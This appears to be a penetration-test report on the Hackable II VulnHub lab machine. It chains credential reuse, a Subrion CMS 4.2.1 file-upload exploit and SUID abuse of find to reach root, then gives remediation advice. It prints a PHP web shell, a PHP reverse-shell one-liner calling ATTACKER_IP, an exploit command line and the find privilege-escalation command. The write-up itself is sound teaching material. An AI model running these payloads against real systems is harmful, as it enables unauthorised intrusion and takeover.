# Penetration Test Report — Hackable II

## 1. Executive Summary

An assessment was conducted against the target system **Hackable II** to evaluate security posture across exposed network services, web application components, and privilege boundaries.

The engagement resulted in **full system compromise**, achieved through a combination of credential reuse, insecure web application functionality, and privilege escalation via misconfigured SUID binaries.

Key contributing factors included:

* Exposure of hashed credentials on a publicly accessible endpoint
* Weak credential reuse across FTP and web services
* Vulnerable CMS (Subrion CMS v4.2.1) allowing arbitrary file upload
* Insecure file handling leading to remote code execution
* Misconfigured SUID binary enabling root privilege escalation

---

## 2. Scope

**Target System:**

* Hackable II (VulnHub VM)

**In-Scope Services:**

* Web server (HTTPS)
* FTP service
* Local operating system environment

---

## 3. Methodology

The following structured methodology was applied:

1. Network enumeration and service discovery
2. Credential discovery and reuse analysis
3. Web application exploitation
4. Remote code execution acquisition
5. Post-exploitation enumeration
6. Privilege escalation to root

---

## 4. Technical Findings

### 4.1 Network Enumeration

A full port scan was performed using Nmap:

```bash id="xq9p3m"
nmap -T4 -sV -A -p- TARGET_IP
```

### Findings:

* Web service (HTTPS)
* FTP service exposed
* Web endpoint leaking an MD5 hash

---

## 5. Initial Access

### 5.1 MD5 Hash Exposure and Credential Recovery

An MD5 hash was discovered on the HTTPS service. The hash was successfully cracked, yielding:

```
hostinger
```

---

### 5.2 FTP Access via Credential Reuse

FTP login was attempted using reused credentials:

```
hostinger : hostinger
```

Authentication was successful.

---

### 5.3 Cipher-Based Credential Discovery

Within the FTP directory, a file was discovered referencing a Vigenère cipher and an associated key.

Using the key:

```
hostinger
```

The ciphertext was decrypted, revealing credentials associated with the hint “dora”.

---

### 5.4 Web Application Access

The domain was added to the local hosts file:

```
venom.box
```

A web interface was discovered at:

```
/panel/
```

Using the recovered credentials, access to the administrative dashboard was obtained.

---

### 5.5 CMS Exploitation (Subrion CMS v4.2.1)

The target was identified as running:

**Subrion CMS v4.2.1**

This version is publicly known to contain vulnerabilities related to file upload functionality.

Using `searchsploit`, an arbitrary file upload exploit was identified and executed:

```bash id="8j2l9s"
python3 49876.py -u http://venom.box/panel/ --user dora --passw <password>
```

This resulted in limited remote shell access.

---

### 5.6 Command Execution via Uploaded Web Shell

During post-exploitation review of uploaded files, a `.phar` file was identified containing:

```php id="k2m7qp"
<?php system($_GET['cmd']); ?>
```

This enabled command execution via HTTP requests:

```
/uploads/<file>.phar?cmd=
```

A reverse shell was then established using:

```bash id="c9v2zd"
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## 6. User Access

After obtaining shell access, previously discovered credentials were reused:

```
hostinger : hostinger
```

This allowed switching to a lower-privileged system user.

---

### 6.1 Credential Discovery via Local Artifacts

Further enumeration of the user environment revealed `.bash_history`, which referenced a backup file. Additional credentials were recovered via `.htaccess`-related artifacts:

```
nathan : <password>
```

Privilege was escalated to user **nathan**:

```bash id="v5r1ta"
su nathan
```

User-level access was confirmed and the user flag was retrieved:

```
W3_@r3_V3n0m:P
```

---

## 7. Privilege Escalation

### 7.1 SUID Enumeration

System enumeration revealed that `/usr/bin/find` had the SUID bit set:

```bash id="m1k8hz"
find . -exec /bin/bash -p \; -quit
```

---

### 7.2 Root Privilege Escalation

Exploitation of the SUID misconfiguration allowed execution of a privileged shell, resulting in **root access**.

---

## 8. Flags (Proof of Compromise)

* User Flag:

```
W3_@r3_V3n0m:P
```

* Root Flag:

```
H@v3_a_n1c3_l1fe.
```

---

## 9. Impact Assessment

Successful exploitation resulted in:

* Exposure and reuse of weak credentials across services
* Full compromise of a CMS administrative interface
* Remote code execution on the target system
* Access to multiple system users
* Complete root-level compromise via SUID abuse

This represents a **full compromise of confidentiality, integrity, and availability** of the system.

---

## 10. Recommendations

### 10.1 Credential Security

* Eliminate credential reuse across services (FTP, web apps, system users)
* Store secrets securely using hashing with strong algorithms (bcrypt, Argon2)
* Rotate all exposed credentials immediately

### 10.2 Web Application Hardening

* Upgrade Subrion CMS to a patched version
* Disable or restrict file upload functionality
* Enforce strict server-side validation of uploaded files

### 10.3 File Exposure Prevention

* Remove `.bash_history` exposure from production environments
* Secure `.htaccess` and backup files from unauthorized access

### 10.4 Privilege Escalation Mitigation

* Audit and remove unnecessary SUID binaries
* Specifically restrict SUID permissions on utilities like `find`
* Apply principle of least privilege across system binaries

---

## 11. Conclusion

The Hackable II system was fully compromised through a chained exploitation process combining credential reuse, vulnerable web application functionality, and misconfigured privilege escalation controls.

The attack demonstrates how multiple low- and medium-severity issues can combine into a critical full-system compromise when left unaddressed.
